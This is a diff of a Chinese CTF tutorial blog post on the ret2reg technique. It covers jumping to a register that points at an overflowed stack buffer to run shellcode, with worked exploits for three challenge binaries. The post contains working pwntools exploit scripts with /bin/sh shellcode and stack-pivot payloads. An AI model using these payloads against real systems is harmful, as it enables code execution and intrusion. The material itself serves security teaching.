@@ -95,7 +95,7 @@ lightGallery(document.getElementById('post-bg'), {
  }
 });
 document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>ret2reg</h1></div><hr><div id="post-content"><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>ret2reg，即返回到寄存器地址进行攻击，可以绕过地址混淆（ASLR）。</p>
-<p>一般用于开启<code>ASLR</code>的 ret2shellcode 题型，在函数执行后，传入的参数在栈中传给某寄存器，然而该函数在结束前并未将该寄存器复位，就导致这个寄存器仍还保存着参数，当这个参数是<code>shellcode</code>时，只要程序中存在<code>jmp/call reg</code>代码片段时，即可通过 gadget 跳转至该寄存器执行 shellcode。</p>
+<p>一般用于开启<code>ASLR</code>的 ret2shellcode 题型，在函数执行后，传入的参数在栈中传给某寄存器，然而该函数在结束前并未将该寄存器复位，就导致这个寄存器仍还保存着参数，当这个参数是 shellcode 时，只要程序中存在<code>jmp/call reg</code>代码片段时，即可通过 gadget 跳转至该寄存器执行 shellcode。</p>
 <p>该攻击方法之所以能成功，是因为函数内部实现时，溢出的缓冲区地址通常会加载到某个寄存器上，在后来的运行过程中不会修改。</p>
 <blockquote>
 <p>只要在函数<code>ret</code>之前将相关寄存器复位掉，便可以避免此漏洞。</p>
@@ -104,127 +104,87 @@ document.addEventListener("pjax:complete", reset);reset()})</script><meta name="
 <p>主要在于找到寄存器与缓冲区地址的确定性关系，然后从程序中搜索<code>call reg/jmp reg</code>这样的指令</p>
 </blockquote>
 <ol>
-<li>分析和调试程序，查看溢出函数返回时哪个寄存值指向传入的 shellcode</li>
-<li>查找<code>call reg</code>或<code>jmp reg</code>，将指令所在的地址填到<code>EIP</code>位置，即返回地址</li>
+<li>分析和调试程序，查看溢出函数返回时哪个寄存器指向输入缓冲区</li>
+<li>查找<code>call reg</code>或<code>jmp reg</code>，将指令所在的地址填充到<code>EIP</code>位置，即返回地址</li>
 <li>在<code>reg</code>指向的空间上注入 shellcode</li>
 </ol>
 <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><blockquote>
-<p>rsp_shellcode</p>
+<p>例题：rsp_shellcode</p>
 </blockquote>
 <ul>
 <li>源代码</li>
 </ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> test = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> input[<span class="hljs-number">100</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get me with shellcode and RSP!&quot;</span>);<br>    gets(input);<br><br>    <span class="hljs-keyword">if</span>(test) &#123;<br>        <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;jmp *%rsp&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<ol>
-<li><strong>查保护</strong></li>
-</ol>
-<p>没有<code>NX</code>和<code>canary</code>以及<code>PIE</code>保护，即栈可执行。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>   RELRO:    Partial RELRO<br>   Stack:    No canary found<br>   NX:       NX unknown - GNU_STACK missing<br>   PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br>   Stack:    Executable<br>   RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>
-
-
-<ol start="2">
-<li><strong>分析</strong></li>
-</ol>
+<ul>
+<li>分析</li>
+</ul>
+<p>查保护，没有<code>NX</code>和<code>canary</code>以及<code>PIE</code>保护，即栈可执行。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231193752.png'><img src="/assets/Pasted%20image%2020241231193752.png"></p>
 <p>分析源代码发现很明显的栈溢出漏洞，并且溢出字节没有限制。</p>
 <p>源代码中还内嵌了一个<code>jmp rsp</code>的汇编指令，猜测要通过 ret2reg 的方式打 shellcode。</p>
-<p>gdb 调试发现在函数返回的时候<code>rsp</code>仍然指向缓冲区地址。</p>
-<p>这样我们可以通过将返回地址即下面这条指令的地址覆盖为<code>jmp rsp</code>来让<code>rip</code>指向缓冲区，然后我们再发送 shellcode 让程序执行 shellcode。</p>
-<p>先执行<code>jmp rsp</code>再发送 shellcode 是因为程序可以溢出很长的字节，我们可以先将<code>rip</code>指向缓冲区然后再发送 shellcode执行。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*RSP  <span class="hljs-number">0x7fffffffcd78</span> —▸ <span class="hljs-number">0x7ffff7da8d90</span> (__libc_start_call_main+<span class="hljs-number">128</span>) ◂— mov edi, eax<br></code></pre></td></tr></table></figure>
-
-<ol start="3">
-<li><strong>exp</strong></li>
-</ol>
+<p>gdb 调试发现在函数返回的时候<code>rsp</code>仍然指向输入缓冲区地址。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231193332.png'><img src="/assets/Pasted%20image%2020241231193332.png"></p>
+<p>这样我们可以通过将返回地址覆盖为<code>jmp rsp</code>来让<code>rip</code>指向缓冲区，然后在<code>jmp rsp</code>指令后拼接上 shellcode 让程序执行 shellcode。</p>
+<p>可以将 shellcode 拼接在<code>jmp rsp</code>后面是因为程序可以溢出很长的字节，我们可以在填充和<code>jmp rsp</code>的后面直接拼接上 shellcode。但是如果程序溢出长度不满足，那么我们就要通过其它方法了。</p>
+<ul>
+<li>exp</li>
+</ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br><span class="hljs-comment">#查找程序gadget</span><br>jmp_rsp = <span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;jmp rsp&#x27;</span>)))<br><br>payload = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">120</span>,  <br>    jmp_rsp,      <br>    asm(shellcraft.sh())     <br>)<br>sla(<span class="hljs-string">&quot;RSP!\n&quot;</span>,payload)<br>ia()<br></code></pre></td></tr></table></figure>
 
-<blockquote>
-<p>X-CTF Quals 2016 - b0verfl0w</p>
-</blockquote>
-<ol>
-<li><strong>查保护</strong></li>
-</ol>
-<p>32位程序无<code>NX</code>、<code>canary</code>以及<code>PIE</code>保护，栈可执行。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>   RELRO:    Partial RELRO<br>   Stack:    No canary found<br>   NX:       NX unknown - GNU_STACK missing<br>   PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>   Stack:    Executable<br>   RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>
-
-<ol start="2">
-<li><strong>分析</strong></li>
-</ol>
-<p>ida反编译</p>
-<p>程序限制读取50个字节，所以我们只能溢出18个字节，所以并不能进行上题的利用方法。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vul</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+18h] [ebp-20h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n======================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n======================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  fgets(s, <span class="hljs-number">50</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello %s.&quot;</span>, s);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>gdb 动调调试发现<code>esp</code>指向缓冲区。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*ESP  <span class="hljs-number">0xffffbe4c</span> —▸ <span class="hljs-number">0x8048519</span> (main+<span class="hljs-number">11</span>) ◂— leave<br></code></pre></td></tr></table></figure>
-
-<p>我们无法直接返回执行很长的 shellcode，但是可以通过构造汇编指令将栈指针进行一个迁移。</p>
-<p>迁移到一个我们想要它执行的地方，比如payload的前部分。</p>
-<ol start="3">
-<li><strong>exp</strong></li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br>shellcode=asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">push 0x68732f</span><br><span class="hljs-string">push 0x6e69622f</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">push 11</span><br><span class="hljs-string">pop eax</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>sub_esp_jmp = asm(<span class="hljs-string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)<br><br>jmp_esp = <span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;jmp esp&#x27;</span>)))<br>payload = shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) + p32(jmp_esp) + sub_esp_jmp<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>sl(payload)<br><br>ia()<br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p>[广东省大学生攻防大赛 2022]jmp_rsp</p>
+<p>例题：X-CTF Quals 2016 - b0verfl0w</p>
 </blockquote>
-<p>64位程序无<code>NX</code>、<code>PIE</code>保护，栈可执行。</p>
-<p>程序显示存在<code>canary</code>保护。</p>
-<ol>
-<li><strong>查保护</strong></li>
-</ol>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>   RELRO:    Partial RELRO<br>   Stack:    Canary found<br>   NX:       NX unknown - GNU_STACK missing<br>   PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br>   Stack:    Executable<br>   RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>
+<ul>
+<li>分析</li>
+</ul>
+<p>查保护，32位程序无<code>NX</code>、<code>canary</code>以及<code>PIE</code>保护，栈可执行。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231193955.png'><img src="/assets/Pasted%20image%2020241231193955.png"></p>
+<p>ida反编译分析伪代码。</p>
+<p>程序限制读取 50 个字节，所以我们只能溢出 18 个字节。</p>
+<p>接下来 gdb 调试一下。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231194206.png'><img src="/assets/Pasted%20image%2020241231194206.png"></p>
+<p>gdb 动调调试发现，在程序返回时<code>esp</code>寄存器仍然指向输入缓冲区。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231194121.png'><img src="/assets/Pasted%20image%2020241231194121.png"></p>
+<p>并且我们通过 ROPgadget 在程序中搜索到了<code>jmp esp</code>指令。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231194333.png'><img src="/assets/Pasted%20image%2020241231194333.png"></p>
+<p>这样很明显可以进行 ret2reg 利用，但是溢出仅仅只有 18 字节，我们无法像上题一样直接在<code>jmp esp</code>后面拼接 shellcode。这里我们就需要换一种方法了。</p>
+<p>我们无法直接返回执行很长的 shellcode，但是可以通过构造简短的汇编指令将栈指针进行一个迁移。比如我们将其迁移到 payload 的前部分。这样我们可以直接将 payload 的前部分的填充替换为 shellcode，然后通过 ret2reg 迁移执行。</p>
+<ul>
+<li>exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br>shellcode=asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">push 0x68732f</span><br><span class="hljs-string">push 0x6e69622f</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">push 11</span><br><span class="hljs-string">pop eax</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>jmp_esp = <span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;jmp esp&#x27;</span>)))<br>payload = shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) + p32(jmp_esp) + asm(<span class="hljs-string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>sl(payload)<br><br>ia()<br></code></pre></td></tr></table></figure>
 
-<ol start="2">
-<li><strong>分析</strong></li>
-</ol>
-<p>ida反编译查看<code>main</code>函数。</p>
-<p>发现程序存在栈溢出，并且程序并没有进行<code>canary</code>检查。</p>
-<p>所以这个<code>canary</code>是假的。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v3; <span class="hljs-comment">// cl</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is a classic pwn&quot;</span>, argv, envp, v3);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>gdb动调调试发现<code>rsp</code>指向栈空间。</p>
-<p>同样，让<code>rsp</code>进行一个迁移即可。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*RSP  <span class="hljs-number">0x7fffffffcf68</span> —▸ <span class="hljs-number">0x401119</span> (__libc_start_main+<span class="hljs-number">777</span>) ◂— mov edi, eax<br></code></pre></td></tr></table></figure>
-
-<ol start="3">
-<li><strong>exp</strong></li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br>jmp_rsp = <span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;jmp rsp&#x27;</span>)))<br>payload = asm(shellcraft.sh()).ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(jmp_rsp) + asm(<span class="hljs-string">&#x27;sub rsp, 0x90; jmp rsp&#x27;</span>)<br>sl(payload)<br><br>ia()<br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p>ciscn_2019_s_9</p>
+<p>例题：ciscn_2019_s_9</p>
 </blockquote>
-<ol>
-<li><strong>查保护</strong></li>
-</ol>
-<p>几乎没保护，可以尝试打 shellcode。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  checksec ./ciscn_s_9<br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX unknown - GNU_STACK missing<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    Stack:    Executable<br>    RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>
-
-<ol start="2">
-<li><strong>分析</strong></li>
-</ol>
-<p>分析<code>main</code>函数</p>
-<p>发现关键函数<code>pwn</code>，进入查看。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> pwn();<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>分析函数发现，<code>fgets</code>向变量<code>s</code>从标准输入流读取了50个字符，所以存在栈溢出。</p>
-<p>溢出了18个字节。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+8h] [ebp-20h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nHey! ^_^&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nIt&#x27;s nice to meet you&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nDo you have anything to tell?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&gt;&quot;</span>);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  fgets(s, <span class="hljs-number">50</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK bye~&quot;</span>);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
+<ul>
+<li>分析</li>
+</ul>
+<p>查保护发现几乎没保护，可以尝试打 shellcode。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231193955.png'><img src="/assets/Pasted%20image%2020241231193955.png"></p>
+<p>分析<code>main</code>函数，发现关键函数<code>pwn</code>，跟进查看。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231195543.png'><img src="/assets/Pasted%20image%2020241231195543.png"></p>
+<p>分析代码发现，<code>fgets</code>可以向长度为 24 字节的变量<code>s</code>读入 50 个字符，所以存在栈溢出。</p>
+<p>溢出字节为 18 个字节。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231195613.png'><img src="/assets/Pasted%20image%2020241231195613.png"></p>
 <p>gdb 动态调试发现，在<code>pwn</code>函数返回时<code>esp</code>是指向栈顶的。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231195931.png'><img src="/assets/Pasted%20image%2020241231195931.png"></p>
 <p>而且我们在函数表中发现了<code>jmp rsp</code>指令，所以接下来的思路就很清晰了。</p>
-<p>通过<code>ret2reg</code>打 shellcode</p>
-<p>但是我们只溢出了18个字节，并不足够写 shellcode。</p>
-<p>但是我们可以通过<code>jmp esp</code>执行<code>sub esp</code>指令来将栈指针进行一个迁移，然后执行我们的 shellcode。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt;<br><span class="hljs-number">0x08048550</span>      <span class="hljs-number">20</span>      in pwn.c<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────<br> EAX  <span class="hljs-number">1</span><br> EBX  <span class="hljs-number">0xf7fa0000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-number">0x229dac</span><br> ECX  <span class="hljs-number">0x6c0</span><br> EDX  <span class="hljs-number">0xf7fa19b4</span> (_IO_stdfile_1_lock) ◂— <span class="hljs-number">0</span><br> EDI  <span class="hljs-number">0xf7ffcb80</span> (_rtld_global_ro) ◂— <span class="hljs-number">0</span><br> ESI  <span class="hljs-number">0xffffc364</span> —▸ <span class="hljs-number">0xffffc534</span> ◂— <span class="hljs-number">0x746e6d2f</span> (<span class="hljs-string">&#x27;/mnt&#x27;</span>)<br>*EBP  <span class="hljs-number">0xffffc298</span> —▸ <span class="hljs-number">0xf7ffd020</span> (_rtld_global) —▸ <span class="hljs-number">0xf7ffda40</span> ◂— <span class="hljs-number">0</span><br>*ESP  <span class="hljs-number">0xffffc28c</span> —▸ <span class="hljs-number">0x804856f</span> (main+<span class="hljs-number">22</span>) ◂— add esp, <span class="hljs-number">4</span><br>*EIP  <span class="hljs-number">0x8048550</span> (pwn+<span class="hljs-number">149</span>) ◂— ret<br>─────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / <span class="hljs-built_in">set</span> emulate on ]─────────────────────────────────────────────────────────────────────────────<br>   <span class="hljs-number">0x8048541</span> &lt;pwn+<span class="hljs-number">134</span>&gt;    push   eax<br>   <span class="hljs-number">0x8048542</span> &lt;pwn+<span class="hljs-number">135</span>&gt;    call   fflush@plt                  &lt;fflush@plt&gt;<br><br>   <span class="hljs-number">0x8048547</span> &lt;pwn+<span class="hljs-number">140</span>&gt;    add    esp, <span class="hljs-number">0x10</span>     ESP =&gt; <span class="hljs-number">0xffffc260</span> (<span class="hljs-number">0xffffc250</span> + <span class="hljs-number">0x10</span>)<br>   <span class="hljs-number">0x804854a</span> &lt;pwn+<span class="hljs-number">143</span>&gt;    mov    eax, <span class="hljs-number">1</span>        EAX =&gt; <span class="hljs-number">1</span><br>   <span class="hljs-number">0x804854f</span> &lt;pwn+<span class="hljs-number">148</span>&gt;    leave<br> ► <span class="hljs-number">0x8048550</span> &lt;pwn+<span class="hljs-number">149</span>&gt;    ret                                &lt;main+<span class="hljs-number">22</span>&gt;<br>─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ esp <span class="hljs-number">0xffffc28c</span> —▸ <span class="hljs-number">0x804856f</span> (main+<span class="hljs-number">22</span>) ◂— add esp, <span class="hljs-number">4</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│<span class="hljs-number">-008</span> <span class="hljs-number">0xffffc290</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│<span class="hljs-number">-004</span> <span class="hljs-number">0xffffc294</span> —▸ <span class="hljs-number">0xffffc2b0</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">000</span>c│ ebp <span class="hljs-number">0xffffc298</span> —▸ <span class="hljs-number">0xf7ffd020</span> (_rtld_global) —▸ <span class="hljs-number">0xf7ffda40</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│+<span class="hljs-number">004</span> <span class="hljs-number">0xffffc29c</span> —▸ <span class="hljs-number">0xf7d97519</span> 